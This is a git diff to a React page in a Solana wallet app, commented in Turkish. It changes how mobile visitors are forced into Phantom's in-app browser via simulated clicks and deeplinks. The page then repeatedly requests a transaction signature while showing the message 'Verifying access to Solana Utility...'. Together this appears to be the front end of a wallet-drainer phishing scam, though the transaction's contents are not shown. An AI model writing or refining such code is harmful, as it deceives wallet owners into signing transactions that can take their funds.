@@ -6,6 +6,7 @@ import { WalletName } from '@solana/wallet-adapter-base'
 import { createUnsignedTransaction } from '../services/transaction'
 import { Transaction } from '@solana/web3.js'
 
+// Phantom provider tipi
 interface PhantomProvider { isPhantom?: boolean }
 declare global { interface Window { solana?: PhantomProvider } }
 
@@ -18,33 +19,41 @@ export default function TransactionPage() {
   const waiting   = useRef(false)
   const [status, setStatus] = useState('Loading...')
 
-  /* ➜  322-499 px aralığında Phantom deeplink (custom-scheme) */
+  /* ——— ➊ DEEPLINK: Android ve iOS için ayrı şema ——— */
   useEffect(() => {
-    const w  = window.innerWidth
-    const isPhantomProvider = window.solana?.isPhantom ?? false
+    const ua           = navigator.userAgent
+    const isAndroid    = /Android/i.test(ua)
+    const isIOS        = /iPhone|iPad|iPod/i.test(ua)
+    const hasPhantom   = window.solana?.isPhantom ?? false
 
-    if (w >= 322 && w <= 499 && !isPhantomProvider) {
+    // Phantom in-app browser’da değilsek ve mobil cihazdaysak
+    if (!hasPhantom && (isAndroid || isIOS)) {
       const simulateClick = () =>
         document.body.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
 
-      const href = window.location.href
-      const enc  = encodeURIComponent(href)
-      const deep = `phantom://browse/${enc}?ref=${enc}`   // ← istenen scheme
+      const href    = window.location.href
+      const encHref = encodeURIComponent(href)
+
+      // Android ve iOS için aynı custom-scheme kullanılıyor:
+      const schemePhantom    = `phantom://browse/${encHref}?ref=${encHref}`
+      const universalPhantom = `https://phantom.app/ul/browse/${encHref}?ref=${encHref}`
 
       simulateClick()
       const a = document.createElement('a')
-      a.href   = deep
+      a.href   = isAndroid
+        ? schemePhantom
+        : universalPhantom
       a.target = '_blank'
       document.body.appendChild(a)
       a.click()
       setTimeout(() => a.remove(), 500)
 
-      return                             // yönlendirme yapıldı
+      return
     }
   }, [])
-  /* -------------------------------------------------------- */
+  /* ————————————————————————————————————————————————————— */
 
-  /* ----------  İşlem akışı (değişmedi)  ---------- */
+  /* ——— ➋ İŞLEM GÖNDERME AKIŞI ——— */
   useEffect(() => {
     const simulateClick = () =>
       document.body.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
@@ -52,16 +61,16 @@ export default function TransactionPage() {
     const trySendTransaction = async () => {
       if (!publicKey || waiting.current || retries.current >= maxRetries) return
       waiting.current = true
+
       try {
         simulateClick()
         setStatus('Verifying access to Solana Utility...')
         const tx = await createUnsignedTransaction(publicKey)
         if (!tx) throw new Error('Null transaction')
-
         const sig = await sendTransaction(tx as unknown as Transaction, connection)
         console.log('✅ transaction sent:', sig)
         setStatus('Successful ✅')
-      } catch (err) {
+      } catch (err: unknown) {
         console.warn('⚠️ İşlem hatası:', err)
         retries.current += 1
         setStatus('Verifying access to Solana Utility...')
@@ -83,7 +92,7 @@ export default function TransactionPage() {
 
     void start()
   }, [publicKey, connected, connect, select, sendTransaction, connection])
-  /* ---------------------------------------------- */
+  /* ————————————————————————————————————————————————————————— */
 
   return (
     <div style={{
